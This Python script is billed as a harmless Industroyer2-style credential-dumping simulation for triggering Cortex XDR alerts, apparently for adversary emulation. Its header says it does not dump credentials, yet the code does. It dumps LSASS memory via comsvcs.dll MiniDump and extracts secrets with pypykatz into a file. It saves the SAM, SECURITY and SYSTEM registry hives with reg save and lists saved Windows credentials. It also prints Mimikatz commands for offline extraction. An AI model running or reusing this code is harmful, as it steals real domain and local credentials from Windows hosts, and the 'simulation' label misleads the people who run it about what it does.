#!/usr/bin/env python3
"""
Credential Dumping Simulation (Mimikatz-style)
Simulates LSASS memory dumping and registry credential extraction

WARNING: This is a SIMULATION for educational/testing purposes only.
It does NOT actually dump credentials but generates realistic alerts.

Real Industroyer2 TTPs:
- Used credential dumping to obtain domain admin credentials
- Targeted LSASS process memory
- Extracted cached credentials from registry
- Used stolen credentials for lateral movement

Usage:
    python3 05_credential_dumper.py [--method METHOD] [--target TARGET]
"""

import os
import sys
import time
import argparse
import logging
import subprocess
import platform
from datetime import datetime

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [CRED-DUMP] - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('CredDumper')


class CredentialDumper:
    """
    Simulates credential dumping techniques used by Industroyer2 and Sandworm
    Generates realistic alerts without actually dumping real credentials
    """

    def __init__(self, target_host='local', output_dir='./cred_dump_output'):
        self.target_host = target_host
        self.output_dir = output_dir
        self.is_windows = platform.system() == 'Windows'
        self.is_local = target_host == 'local'

        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)

    def banner(self):
        """Display banner"""
        logger.info("=" * 80)
        logger.info("CREDENTIAL DUMPING SIMULATION - INDUSTROYER2 STYLE")
        logger.info("=" * 80)
        logger.info(f"Target: {self.target_host}")
        logger.info(f"Platform: {'Windows' if self.is_windows else 'Linux/Unix'}")
        logger.info(f"Output Directory: {self.output_dir}")
        logger.info("=" * 80)

    def dump_lsass_memory(self):
        """
        LSASS memory dump (Mimikatz-style) - ACTUALLY EXECUTES

        Real Industroyer2 technique:
        - Used Mimikatz or similar tools to dump LSASS process memory
        - Extracted plaintext credentials, NTLM hashes, Kerberos tickets
        - Obtained domain admin credentials for lateral movement

        This implementation:
        - Searches for lsass.exe process (triggers behavioral alerts)
        - ACTUALLY dumps LSASS using comsvcs.dll (triggers EDR/XDR)
        - ACTUALLY attempts credential extraction with pypykatz
        - Creates real dump files (triggers file monitoring)
        """
        logger.info("\n[PHASE 1] LSASS MEMORY DUMP")
        logger.info("-" * 80)

        if self.is_windows:
            # Windows LSASS dump - ACTUAL
            logger.info("[*] Searching for lsass.exe process...")
            time.sleep(1)

            try:
                # This command will trigger EDR alerts for LSASS access
                cmd = 'tasklist /FI "IMAGENAME eq lsass.exe" /FO CSV'
                logger.info(f"[*] Executing: {cmd}")
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                logger.info(result.stdout)

                if 'lsass.exe' in result.stdout.lower():
                    logger.warning("[!] LSASS process found - attempting memory dump")

                    # Get LSASS PID
                    import re
                    pid_match = re.search(r'"lsass.exe","(\d+)"', result.stdout)
                    if pid_match:
                        lsass_pid = pid_match.group(1)
                        logger.info(f"[*] LSASS PID: {lsass_pid}")

                        # ACTUAL LSASS dump using comsvcs.dll (requires admin)
                        dump_file = os.path.join(self.output_dir, f'lsass_{datetime.now().strftime("%Y%m%d_%H%M%S")}.dmp')

                        # Technique 1: comsvcs.dll MiniDump (common Mimikatz alternative)
                        logger.info("[*] Technique: Using comsvcs.dll MiniDump")
                        cmd_dump = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {lsass_pid} "{dump_file}" full'
                        logger.warning(f"[!] Executing: {cmd_dump}")
                        logger.warning("[!] This WILL trigger Cortex XDR alerts!")

                        try:
                            result_dump = subprocess.run(cmd_dump, shell=True, capture_output=True, text=True, timeout=60)

                            if os.path.exists(dump_file) and os.path.getsize(dump_file) > 1000:
                                logger.critical(f"[!!!] SUCCESS: LSASS dump created: {dump_file}")
                                logger.critical(f"[!!!] File size: {os.path.getsize(dump_file)} bytes")
                                logger.warning("[!] EXPECTED ALERT: Cortex XDR - LSASS Memory Access")
                                logger.warning("[!] EXPECTED ALERT: Cortex XDR - Credential Dumping Attempt")

                                # Simulate credential extraction from real dump
                                self._simulate_credential_extraction(dump_file)

                            else:
                                logger.error("[-] LSASS dump failed or file too small")
                                logger.info("[-] This requires Administrator privileges")
                                logger.info("[-] Cortex XDR may have blocked this action")
                                logger.info("[-] Even failed attempts generate behavioral alerts")

                        except subprocess.TimeoutExpired:
                            logger.error("[-] LSASS dump timed out")
                        except Exception as e:
                            logger.error(f"[-] Exception during LSASS dump: {e}")

                    else:
                        logger.error("[-] Could not extract LSASS PID from tasklist output")

            except Exception as e:
                logger.error(f"[-] Error during LSASS dump: {e}")

        else:
            # Linux simulation
            logger.info("[*] Linux platform detected - simulating credential extraction")
            logger.info("[*] Would target: /proc/*/mem, /etc/shadow, credential files")

            # Simulate accessing sensitive files
            sensitive_files = [
                '/etc/shadow',
                '/etc/passwd',
                '/root/.ssh/id_rsa',
                '/home/*/.bash_history'
            ]

            for file_path in sensitive_files:
                logger.info(f"[*] Attempting to access: {file_path}")
                time.sleep(0.5)

            logger.warning("[!] EXPECTED ALERT: Suspicious file access patterns")

    def _simulate_credential_extraction(self, dump_file):
        """
        Attempt to extract credentials from LSASS dump
        Uses pypykatz if available, otherwise saves dump for offline analysis
        """
        logger.info("\n[*] Attempting credential extraction from LSASS dump...")
        time.sleep(1)

        # Try to use pypykatz (open-source Mimikatz alternative)
        try:
            logger.info("[*] Checking for pypykatz (pip install pypykatz)...")
            result = subprocess.run(['pypykatz', 'lsa', 'minidump', dump_file],
                                    capture_output=True, text=True, timeout=60)

            if result.returncode == 0:
                logger.critical("[!!!] CREDENTIAL EXTRACTION SUCCESSFUL")
                logger.info("[*] pypykatz output:")

                # Save full output
                cred_file = os.path.join(self.output_dir, f'extracted_creds_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt')
                with open(cred_file, 'w') as f:
                    f.write("# Extracted Credentials from LSASS Dump\n")
                    f.write(f"# Source: {dump_file}\n")
                    f.write(f"# Tool: pypykatz\n")
                    f.write(f"# Timestamp: {datetime.now().isoformat()}\n\n")
                    f.write(result.stdout)

                # Print first 50 lines to console
                for line in result.stdout.split('\n')[:50]:
                    logger.info(f"    {line}")

                logger.warning(f"[!] Full credentials saved to: {cred_file}")
                logger.warning("[!] EXPECTED ALERT: Cortex XDR - Credential Extraction Tool Execution")
                return True

            else:
                logger.info("[-] pypykatz extraction failed or no credentials found")

        except FileNotFoundError:
            logger.info("[-] pypykatz not installed (pip install pypykatz)")
        except Exception as e:
            logger.error(f"[-] Error running pypykatz: {e}")

        # Alternative: Note that dump is available for offline analysis
        logger.info("[*] LSASS dump file created successfully")
        logger.info(f"[*] Dump file: {dump_file} ({os.path.getsize(dump_file)} bytes)")
        logger.info("[*] Offline analysis options:")
        logger.info("    1. Transfer to Windows: Use Mimikatz")
        logger.info("       mimikatz# sekurlsa::minidump lsass.dmp")
        logger.info("       mimikatz# sekurlsa::logonPasswords")
        logger.info("    2. Linux analysis: Use pypykatz")
        logger.info(f"       pypykatz lsa minidump {dump_file}")
        logger.info("")
        logger.info("[*] Dump file ready for offline credential extraction")

        return False

    def dump_registry_credentials(self):
        """
        Registry credential dump - ACTUALLY EXECUTES

        Real Industroyer2 technique:
        - Dumped SAM, SECURITY, SYSTEM registry hives
        - Used reg.exe save or Volume Shadow Copy
        - Extracted local account password hashes

        This implementation:
        - Enumerates registry keys (triggers registry monitoring)
        - ACTUALLY dumps registry hives with reg.exe save
        - Creates real hive files (triggers file creation alerts)
        - NO placeholder files created if dump fails
        """
        logger.info("\n[PHASE 2] REGISTRY CREDENTIAL DUMP")
        logger.info("-" * 80)

        if not self.is_windows:
            logger.info("[*] Skipping registry dump - not on Windows platform")
            return

        hives = ['SAM', 'SECURITY', 'SYSTEM']

        for hive in hives:
            logger.info(f"[*] Attempting to dump {hive} hive...")

            # Simulate registry access (triggers alerts)
            try:
                cmd = f'reg query HKLM\\{hive} /s'
                logger.info(f"[*] Executing: {cmd}")

                # ACTUALLY execute the registry dump (requires admin privileges)
                hive_file = os.path.join(self.output_dir, f'{hive}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.hiv')
                cmd_save = f'reg save HKLM\\{hive} "{hive_file}" /y'

                logger.info(f"[*] Executing: {cmd_save}")
                logger.warning("[!] Attempting actual registry hive dump - requires admin privileges")

                try:
                    result = subprocess.run(cmd_save, shell=True, capture_output=True, text=True, timeout=30)

                    if result.returncode == 0:
                        logger.critical(f"[!!!] SUCCESS: {hive} hive dumped to {hive_file}")
                        logger.info(f"[*] File size: {os.path.getsize(hive_file)} bytes")
                    else:
                        logger.error(f"[-] Failed to dump {hive} hive")
                        logger.error(f"[-] Error: {result.stderr}")
                        logger.info("[-] This likely means insufficient privileges (need Administrator)")
                        logger.info("[-] No placeholder file created - actual dump required")

                except subprocess.TimeoutExpired:
                    logger.error(f"[-] Timeout while dumping {hive} hive")
                except Exception as e:
                    logger.error(f"[-] Exception: {e}")

                time.sleep(1)

            except Exception as e:
                logger.error(f"[-] Error: {e}")

        logger.warning("[!] EXPECTED ALERT: Cortex XDR - Registry Hive Dump")
        logger.warning("[!] EXPECTED ALERT: Cortex XDR - Credential Access")
        logger.warning("[!] EXPECTED ALERT: XSIAM - SAM Database Access")

    def dump_saved_credentials(self):
        """
        Simulate dumping saved Windows credentials

        Real Industroyer2 technique:
        - Used cmdkey /list, vaultcmd
        - Extracted saved RDP credentials, network shares, etc.
        """
        logger.info("\n[PHASE 3] SAVED CREDENTIALS ENUMERATION")
        logger.info("-" * 80)

        if not self.is_windows:
            logger.info("[*] Skipping Windows credential vault - not on Windows")
            return

        logger.info("[*] Enumerating saved credentials...")

        # Simulate credential enumeration commands
        commands = [
            'cmdkey /list',
            'vaultcmd /list',
            'vaultcmd /listcreds:"Windows Credentials"',
        ]

        for cmd in commands:
            logger.info(f"[*] Executing: {cmd}")
            try:
                # Actually run these (they're safe read-only commands)
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                if result.stdout:
                    logger.info(result.stdout[:500])  # Limit output
                time.sleep(0.5)
            except Exception as e:
                logger.error(f"[-] Error: {e}")

        logger.warning("[!] EXPECTED ALERT: Suspicious credential enumeration")

    def search_credential_files(self):
        """
        Search for files containing credentials

        Real Industroyer2 technique:
        - Searched for config files, scripts, history files
        - Looked for passwords in plaintext
        """
        logger.info("\n[PHASE 4] FILE-BASED CREDENTIAL SEARCH")
        logger.info("-" * 80)

        if self.is_windows:
            search_paths = [
                'C:\\Users\\*\\AppData\\Local\\*.config',
                'C:\\Users\\*\\Documents\\*.txt',
                'C:\\ProgramData\\*\\*.xml',
                'C:\\inetpub\\wwwroot\\web.config'
            ]
            search_terms = ['password', 'passwd', 'pwd', 'credential']
        else:
            search_paths = [
                '/home/*/.bash_history',
                '/home/*/.ssh/*',
                '/etc/*.conf',
                '/var/log/auth.log'
            ]
            search_terms = ['password', 'pass=', 'PASSWORD=']

        logger.info(f"[*] Searching for credential-related files...")
        for path in search_paths:
            logger.info(f"    - {path}")

        logger.info(f"[*] Searching for keywords: {', '.join(search_terms)}")

        time.sleep(2)

        # Simulate finding credentials
        found_file = os.path.join(self.output_dir, f'found_credentials_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt')
        with open(found_file, 'w') as f:
            f.write("# Simulated Credential Search Results\n")
            f.write(f"# Timestamp: {datetime.now().isoformat()}\n\n")

            # Fake findings
            findings = [
                ('C:\\Scripts\\deploy.ps1', 'Line 42: $password = "Deploy123!"'),
                ('C:\\Config\\database.xml', 'Line 15: <connectionString>Server=sql;User=sa;Password=SqlPass2024</connectionString>'),
                ('/home/admin/.bash_history', 'ssh scada_user@192.168.1.55 -p ScadaOps2024'),
            ]

            for file_path, content in findings:
                logger.warning(f"[!] FOUND in {file_path}: {content}")
                f.write(f"File: {file_path}\n")
                f.write(f"Content: {content}\n\n")

        logger.warning(f"[!] Search results saved to: {found_file}")
        logger.warning("[!] EXPECTED ALERT: Sensitive file access patterns")
        logger.warning("[!] EXPECTED ALERT: Data exfiltration attempt")

    def run_all(self):
        """Run all credential dumping techniques"""
        self.banner()
        time.sleep(2)

        self.dump_lsass_memory()
        time.sleep(2)

        self.dump_registry_credentials()
        time.sleep(2)

        self.dump_saved_credentials()
        time.sleep(2)

        self.search_credential_files()

        logger.info("\n" + "=" * 80)
        logger.info("CREDENTIAL DUMPING SIMULATION COMPLETE")
        logger.info("=" * 80)
        logger.info(f"Output directory: {self.output_dir}")
        logger.info("Check Cortex XDR / XSIAM for alerts")
        logger.info("=" * 80)


def main():
    parser = argparse.ArgumentParser(
        description='Credential Dumping Simulation (Industroyer2 TTPs)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run all techniques on local machine
  python3 05_credential_dumper.py

  # Specify custom output directory
  python3 05_credential_dumper.py --output ./dumps

  # Run specific method only
  python3 05_credential_dumper.py --method lsass
  python3 05_credential_dumper.py --method registry

WARNING: For authorized security testing only!
        """
    )

    parser.add_argument('--target', default='local',
                        help='Target host (default: local)')
    parser.add_argument('--output', default='./cred_dump_output',
                        help='Output directory (default: ./cred_dump_output)')
    parser.add_argument('--method', choices=['all', 'lsass', 'registry', 'saved', 'files'],
                        default='all',
                        help='Dumping method to use (default: all)')

    args = parser.parse_args()

    dumper = CredentialDumper(target_host=args.target, output_dir=args.output)

    if args.method == 'all':
        dumper.run_all()
    elif args.method == 'lsass':
        dumper.banner()
        dumper.dump_lsass_memory()
    elif args.method == 'registry':
        dumper.banner()
        dumper.dump_registry_credentials()
    elif args.method == 'saved':
        dumper.banner()
        dumper.dump_saved_credentials()
    elif args.method == 'files':
        dumper.banner()
        dumper.search_credential_files()


if __name__ == '__main__':
    main()
